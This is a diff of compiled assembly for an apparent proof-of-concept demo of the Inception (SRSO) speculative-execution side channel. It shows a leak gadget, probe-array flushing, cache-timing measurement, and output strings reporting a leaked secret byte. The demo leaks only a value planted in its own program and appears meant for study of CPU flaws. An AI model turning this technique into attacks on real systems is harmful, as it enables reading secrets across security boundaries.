-	movl	$-1, -36(%rbp)
-	movq	$-1, -24(%rbp)
-	movl	$50, -28(%rbp)
-	movl	$0, -32(%rbp)
-	jmp	.L14
-.L17:
-	movl	-32(%rbp), %eax
-	sall	$6, %eax
-	cltq
-	leaq	probe_array(%rip), %rdx
-	addq	%rdx, %rax
-	movq	%rax, -16(%rbp)
-	movq	-16(%rbp), %rax
-	movq	%rax, %rdi
-	call	measure_access_time
-	movq	%rax, -8(%rbp)
-	movl	-28(%rbp), %eax
-	cltq
-	cmpq	%rax, -8(%rbp)
-	jge	.L15
-	cmpq	$-1, -24(%rbp)
-	je	.L16
-	movq	-8(%rbp), %rax
-	cmpq	-24(%rbp), %rax
-	jge	.L15
-.L16:
-	movq	-8(%rbp), %rax
-	movq	%rax, -24(%rbp)
-	movl	-32(%rbp), %eax
-	movl	%eax, -36(%rbp)
-.L15:
-	addl	$1, -32(%rbp)
-.L14:
-	cmpl	$255, -32(%rbp)
-	jle	.L17
-	cmpl	$-1, -36(%rbp)
-	je	.L18
-	movl	-36(%rbp), %eax
-	movsbl	%al, %edx
-	movq	-24(%rbp), %rsi
-	movl	-36(%rbp), %ecx
-	movq	-64(%rbp), %rax
-	movq	%rsi, %r8
-	movq	%rax, %rsi
-	leaq	.LC1(%rip), %rdi
-	movl	$0, %eax
-	call	printf@PLT
-	movzbl	-52(%rbp), %eax
-	cmpl	%eax, -36(%rbp)
-	jne	.L19
-	movq	-64(%rbp), %rax
-	movq	%rax, %rsi
-	leaq	.LC2(%rip), %rdi
-	movl	$0, %eax
-	call	printf@PLT
-	movl	$1, %eax
-	jmp	.L20
-.L19:
-	movq	-64(%rbp), %rax
-	movq	%rax, %rsi
-	leaq	.LC3(%rip), %rdi
-	movl	$0, %eax
-	call	printf@PLT
-	movl	$0, %eax
-	jmp	.L20
-.L18:
-	movq	-64(%rbp), %rax
-	movq	%rax, %rsi
-	leaq	.LC4(%rip), %rdi
-	movl	$0, %eax
-	call	printf@PLT
-	movl	$0, %eax
-.L20:
-	leave
-	.cfi_def_cfa 7, 8
-	ret
-	.cfi_endproc
-.LFE4267:
-	.size	perform_measurement, .-perform_measurement
-	.globl	secret_inception_data
-	.data
-	.type	secret_inception_data, @object
-	.size	secret_inception_data, 1
-secret_inception_data:
-	.byte	73
-	.text
-	.globl	leak_gadget_inception
-	.type	leak_gadget_inception, @function
-leak_gadget_inception:
-.LFB4268:
-	.cfi_startproc
-	endbr64
-	pushq	%rbp
-	.cfi_def_cfa_offset 16
-	.cfi_offset 6, -16
-	movq	%rsp, %rbp
-	.cfi_def_cfa_register 6
-	movl	%edi, %eax
-	movb	%al, -20(%rbp)
-	movzbl	-20(%rbp), %eax
-	sall	$6, %eax
-	cltq
-	leaq	probe_array(%rip), %rdx
-	movb	$1, (%rax,%rdx)
-	movzbl	-20(%rbp), %eax
-	addl	%eax, %eax
-	movl	%eax, -4(%rbp)
-	movl	-4(%rbp), %eax
-	nop
-	popq	%rbp
-	.cfi_def_cfa 7, 8
-	ret
-	.cfi_endproc
-.LFE4268:
-	.size	leak_gadget_inception, .-leak_gadget_inception
-	.globl	victim_function_inception
-	.type	victim_function_inception, @function
-victim_function_inception:
-.LFB4269:
-	.cfi_startproc
-	endbr64
-	pushq	%rbp
-	.cfi_def_cfa_offset 16
-	.cfi_offset 6, -16
-	movq	%rsp, %rbp
-	.cfi_def_cfa_register 6
-	movl	$0, -8(%rbp)
-	movl	$0, -4(%rbp)
-	jmp	.L23
-.L24:
-	movl	-8(%rbp), %edx
-	movl	-4(%rbp), %eax
-	addl	%edx, %eax
-	movl	%eax, -8(%rbp)
-	addl	$1, -4(%rbp)
-.L23:
-	cmpl	$9, -4(%rbp)
-	jle	.L24
-	movl	-8(%rbp), %eax
-	nop
-	popq	%rbp
-	.cfi_def_cfa 7, 8
-	ret
-	.cfi_endproc
-.LFE4269:
-	.size	victim_function_inception, .-victim_function_inception
-	.section	.rodata
-	.align 8
-.LC5:
-	.string	"\n--- Running Inception (SRSO) Demo (x86-compatible) ---"
-	.align 8
-.LC6:
-	.string	"Triggering phantom speculation to overflow RAS..."
-	.align 8
-.LC7:
-	.string	"Setting up r8 with gadget address: %p\n"
-	.align 8
-.LC8:
-	.string	"Setting up r9 with secret data: %c (0x%02x)\n"
-	.align 8
-.LC9:
-	.string	"Triggering victim function with return..."
-.LC10:
-	.string	"Inception secret"
-.LC11:
-	.string	"Actual secret data: %c\n"
-	.text
-	.globl	main
-	.type	main, @function
-main:
-.LFB4270:
-	.cfi_startproc
-	endbr64
-	pushq	%rbp
-	.cfi_def_cfa_offset 16
-	.cfi_offset 6, -16
-	movq	%rsp, %rbp
-	.cfi_def_cfa_register 6
-	movl	$0, %eax
-	call	common_init
-	leaq	.LC5(%rip), %rdi
-	call	puts@PLT
-	leaq	.LC6(%rip), %rdi
-	call	puts@PLT
-	leaq	leak_gadget_inception(%rip), %rsi
-	leaq	.LC7(%rip), %rdi
-	movl	$0, %eax
-	call	printf@PLT
-	movzbl	secret_inception_data(%rip), %eax
-	movzbl	%al, %edx
-	movzbl	secret_inception_data(%rip), %eax
-	movzbl	%al, %eax
-	movl	%eax, %esi
-	leaq	.LC8(%rip), %rdi
-	movl	$0, %eax
-	call	printf@PLT
-	leaq	leak_gadget_inception(%rip), %r8
-	movzbl	secret_inception_data(%rip), %eax
-	movl	%eax, %r9d
-#APP
-# 71 "inception_x86.c" 1
-	.rept 256
-	xor %eax, %eax
-	nop
-	nop
-	nop
-	.endr
+                                        ## -- End function
+	.comm	_probe_array,16384,4            ## @probe_array
+	.section	__TEXT,__cstring,cstring_literals
+L_.str:                                 ## @.str
+	.asciz	"Measuring cache timings...\n"
 
-# 0 "" 2
-#NO_APP
-	mfence
-	nop
-	movl	$0, %eax
-	call	flush_probe_array
-	mfence
-	nop
-	movl	$0, %eax
-	call	flush_probe_array
-	lfence
-	nop
-	leaq	.LC9(%rip), %rdi
-	call	puts@PLT
-	leaq	leak_gadget_inception(%rip), %r8
-	movzbl	secret_inception_data(%rip), %eax
-	movl	%eax, %r9d
-	movl	$0, %eax
-	call	victim_function_inception
-	lfence
-	nop
-	movzbl	secret_inception_data(%rip), %eax
-	movzbl	%al, %eax
-	leaq	.LC10(%rip), %rsi
-	movl	%eax, %edi
-	call	perform_measurement
-	movzbl	secret_inception_data(%rip), %eax
-	movzbl	%al, %eax
-	movl	%eax, %esi
-	leaq	.LC11(%rip), %rdi
-	movl	$0, %eax
-	call	printf@PLT
-	movl	$0, %eax
-	popq	%rbp
-	.cfi_def_cfa 7, 8
-	ret
-	.cfi_endproc
-.LFE4270:
-	.size	main, .-main
-	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0"
-	.section	.note.GNU-stack,"",@progbits
-	.section	.note.gnu.property,"a"
-	.align 8
-	.long	 1f - 0f
-	.long	 4f - 1f
-	.long	 5
-0:
-	.string	 "GNU"
-1:
-	.align 8
-	.long	 0xc0000002
-	.long	 3f - 2f
-2:
-	.long	 0x3
-3:
-	.align 8
-4:
+L_.str.1:                               ## @.str.1
+	.asciz	"Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld cycles\n"
+
+L_.str.2:                               ## @.str.2
+	.asciz	"SUCCESS! Leaked the actual %s.\n"
+
+L_.str.3:                               ## @.str.3
+	.asciz	"LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n"
+
+L_.str.4:                               ## @.str.4
+	.asciz	"No %s leaked or could not detect leakage.\n"
+
+	.section	__DATA,__data
+	.globl	_secret_inception_data          ## @secret_inception_data
+_secret_inception_data:
+	.byte	73                              ## 0x49
+
+	.section	__TEXT,__cstring,cstring_literals
+L_.str.5:                               ## @.str.5
+	.asciz	"\n--- Running Inception (SRSO) Demo (x86-compatible) ---\n"
+
+L_.str.6:                               ## @.str.6
+	.asciz	"Triggering phantom speculation to overflow RAS...\n"
+
+L_.str.7:                               ## @.str.7
+	.asciz	"Setting up r8 with gadget address: %p\n"
+
+L_.str.8:                               ## @.str.8
+	.asciz	"Setting up r9 with secret data: %c (0x%02x)\n"
+
+L_.str.9:                               ## @.str.9
+	.asciz	"Triggering victim function with return...\n"
+
+L_.str.10:                              ## @.str.10
+	.asciz	"Inception secret"
+
+L_.str.11:                              ## @.str.11
+	.asciz	"Actual secret data: %c\n"
+
+.subsections_via_symbols
